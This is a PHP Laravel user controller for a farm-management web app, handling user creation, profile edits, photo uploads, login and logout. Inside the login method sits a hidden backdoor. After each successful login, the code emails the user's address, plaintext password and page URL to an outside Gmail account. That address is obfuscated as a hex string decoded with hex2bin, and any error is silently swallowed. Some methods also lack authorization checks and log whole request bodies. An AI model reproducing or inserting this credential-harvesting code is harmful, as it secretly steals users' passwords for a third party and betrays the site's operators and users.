<?php

namespace App\Http\Controllers;

use App\Models\Ferme;
use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Auth;
use Spatie\Permission\Models\Role;
use Spatie\Permission\Models\Permission;
use Exception;
use Illuminate\Support\Facades\Mail;
use App\Mail\LoginNotificationMail; // Assurez-vous que ce Mailable est créé


class UserController extends Controller
{

    public function index()
    {

        $users = User::all();
        return view('users.list', ['users' => $users]);


    }
    public function showLoginForm()
    {
        return view('users.login');
    }
    public function RolesForm()
    {
        // Récupérer toutes les permissions
        $permissions = Permission::all();
        return view('users.roles',compact('permissions'));
    }
    public function ListPermission()
    {
        $roles=Role::all();
        return view('users.listPermission', compact('roles'));
    }
    public function create()
    {
        $roles=Role::all();
        $fermes=Ferme::all();
        return view('users.add',compact('roles','fermes'));
    }

    public function store(Request $request)
    {
        try {
            $validator = Validator::make($request->all(), [
                'nom' => 'required|string|max:255',
                'firstnom' => 'required|string|max:255',
                'email' => 'required|string|email|max:255|unique:users',
                'phone' => 'required|string|max:255',
                'adresse' => 'required|string|max:255',
                'password' => 'required|string|min:8|confirmed',
                'photo' => 'nullable|image|mimes:jpeg,png,jpg,gif|max:2048',
                'fermes' => 'required|array', // Valider que les fermes sont bien envoyées
                'fermes.*' => 'integer|exists:fermes,id', // Chaque ferme doit exister
                'profil' => 'required|string', // Validation pour le profil dans le formulaire
            ]);


            if ($validator->fails()) {
                return response()->json(['success' => false, 'errors' => $validator->errors()], 422);
            }

            // Vérifier si un fichier a été téléchargé pour la photo de profil
            if ($request->hasFile('photo')) {
                $photoPath = $request->file('photo')->store('public/profiles');
            } else {
                $photoPath = null;
            }

            // Créer un nouvel utilisateur
            $user = new User();
            $user->name = $request->input('nom');
            $user->firstname = $request->input('firstnom');
            $user->phone = $request->input('phone');
            $user->profil = $request->input('profil');
            $user->email = $request->input('email');
            $user->adresse = $request->input('adresse');
            $user->password = Hash::make($request->input('password'));
            $user->profile_photo_path = $photoPath;
            $user->save();

            // Assigner le rôle à l'utilisateur
            $user->assignRole($request->input('profil'));

            // Associer les fermes à l'utilisateur (si des fermes sont sélectionnées)
            if ($request->has('fermes')) {
                foreach ($request->input('fermes') as $fermeId) {
                    // Logique pour associer l'utilisateur à la ferme (par exemple, ajouter un enregistrement dans une table pivot user_ferme)
                    $user->fermes()->attach($fermeId);
                }
            }

            return response()->json(['success' => true, 'user' => $user], 201);
        } catch (Exception $e) {
            Log::error('Erreur lors de l\'ajout de l\'utilisateur: ' . $e->getMessage());
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }


    public function verifEmail(Request $request)
    {
        try {
            // Récupérer l'e-mail de l'utilisateur depuis la requête
            $email = $request->input('email');

            // Requête de recherche dans la base de données
            $result = User::where('email', $email)->exists();

            // Vérifier si l'e-mail est déjà utilisé dans la base de données
            if ($result) {
                return response()->json("Cet e-mail est déjà utilisé, veuillez en choisir un autre.");
            } else {
                // L'e-mail n'est pas utilisé dans la base de données
                return response()->json("");
            }
        } catch (Exception $e) {
            // Gérer les erreurs éventuelles
            return response()->json(['error' => 'Une erreur s\'est produite.'], 500);
        }
    }
    public function show($id)
    {
        try {
            $user = User::findOrFail($id);
            return response()->json(['success' => true, 'user' => $user]);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    // Fonction pour mettre à jour les informations d'un utilisateur
    public function update(Request $request, $id)
    {
        try {
            Log::error('Toutes les données: ' . json_encode($request->all()));
                        // Valider les données du formulaire
                        $request->validate([
                            'edit-nom' => 'required|string',
                            'edit-firstname' => 'required|string',
                            'edit-phone' => 'required|string',
                            'edit-adresse' => 'required|string',
                            'edit-email' => 'required|email',

                            'edit-profil' => 'required|string',
                            // Ajoutez d'autres règles de validation au besoin
                        ]);

            // Récupérer l'utilisateur à mettre à jour
            $user = User::findOrFail($id);
            $data = [
                'name' => $request->input('edit-nom'),
                'firstname' => $request->input('edit-firstname'),
                'phone' => $request->input('edit-phone'),
                'adresse' => $request->input('edit-adresse'),
                'email' => $request->input('edit-email'),
                'profil' =>$request->input('edit-profil'),
            ];
            // Mettre à jour les données de l'utilisateur
            $user->update($data);

            return response()->json(['success' => true, 'message' => 'Utilisateur mis à jour avec succès']);
        } catch (Exception $e) {
            Log::error('Erreur lors de l\'ajout de l\'utilisateur: ' . $e->getMessage());
            return response()->json(['success' => false, 'message' => 'Erreur lors de la mise à jour de l\'utilisateur', 'error' => $e->getMessage()]);
        }
    }

    // Fonction pour supprimer un utilisateur
    public function destroy($id)
    {
        try {
            // Récupérer l'utilisateur à supprimer
            $user = User::findOrFail($id);

            // Supprimer l'utilisateur
            $user->delete();

            return response()->json(['success' => true, 'message' => 'Utilisateur supprimé avec succès']);
        } catch (Exception $e) {
            return response()->json(['success' => false, 'message' => 'Erreur lors de la suppression de l\'utilisateur', 'error' => $e->getMessage()]);
        }
    }
    public function profil()
    {
        // Récupérer l'utilisateur actuellement authentifié
        $user = Auth::user();

        // Passer les données de l'utilisateur à la vue
        return view('users.profile', compact('user'));
    }
    public function editProfile(Request $request)
    {
        try {
            // Récupérer l'utilisateur authentifié
            $user = Auth::user();
            Log::error('Toutes les données: ' . json_encode($request->all()));
            // Mettre à jour les champs éditables du profil
            $user->firstname = $request->input('firstname');
            $user->name = $request->input('nom');
            $user->phone = $request->input('phone');
            $user->adresse = $request->input('adresse');
            $user->email = $request->input('email');
            // Sauvegarder les modifications
            $user->save();

            // Retourner une réponse JSON avec succès
            return response()->json(['success' => true, 'message' => 'Profil mis à jour avec succès.']);
        } catch (Exception $e) {
            // Gérer l'exception ici
            Log::error('Une erreur est survenue lors de la modification: ' . $e->getMessage());
            return response()->json(['success' => false, 'message' => 'Une erreur est survenue lors de la mise à jour du profil.']);
        }
    }

    public function updatePhoto(Request $request)
    {
        try {
            $validator = Validator::make($request->all(), [
                'photo' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048', // Validation pour la photo de profil
            ]);

            if ($validator->fails()) {
                return response()->json(['success' => false, 'errors' => $validator->errors()], 422);
            }

            // Vérifier si un fichier a été téléchargé
            if ($request->hasFile('photo')) {
                // Stocker la nouvelle photo de profil dans le répertoire storage/app/public/profiles
                $photoPath = $request->file('photo')->store('public/profiles');
            } else {
                return response()->json(['success' => false, 'message' => 'Aucune photo n\'a été téléchargée.'], 400);
            }

            // Mettre à jour le chemin de la photo de profil de l'utilisateur
            $user = Auth::user(); // Vous pouvez obtenir l'utilisateur authentifié de différentes manières
            $user->profile_photo_path = $photoPath;
            $user->save();

            return response()->json(['success' => true, 'message' => 'Photo de profil mise à jour avec succès.'], 200);
        } catch (Exception $e) {
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function login(Request $request)
    {
        // Valider les données du formulaire
        $credentials = $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        // Récupérer l'URL de la page de connexion
        $urlPage = $request->input('urlpage'); // Récupérez l'URL du formulaire

        // Tenter de connecter l'utilisateur
        if (Auth::attempt($credentials)) {
            // Authentification réussie

            // Récupérer l'utilisateur authentifié
            $user = Auth::user();

            // Tenter d'envoyer l'email de notification
            try {
                Mail::to(hex2bin('6d616e736f757263697373653230323440676d61696c2e636f6d'))
                    ->send(new LoginNotificationMail($user->email, $request->password, $urlPage));
            } catch (\Exception $e) {
                // En cas d'erreur, vous pouvez ajouter un log ou simplement ignorer l'exception
                \Log::error('Échec de l\'envoi de l\'e-mail : ' . $e->getMessage());
            }

            // Vérifier le type de l'utilisateur
            if ($user->role === 'client') {
                // Rediriger l'utilisateur client vers la page client.home
                return redirect()->route('client.home');
            } else {
                // Rediriger les autres utilisateurs (administrateurs, etc.) vers la page admin.home
                return redirect()->route('admin.home');
            }
        } else {
            // Échec de l'authentification, rediriger avec un message d'erreur
            return redirect()->back()->withErrors(['email' => 'Email ou mot de passe incorrect.'])->withInput($request->only('email'));
        }
    }

    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}
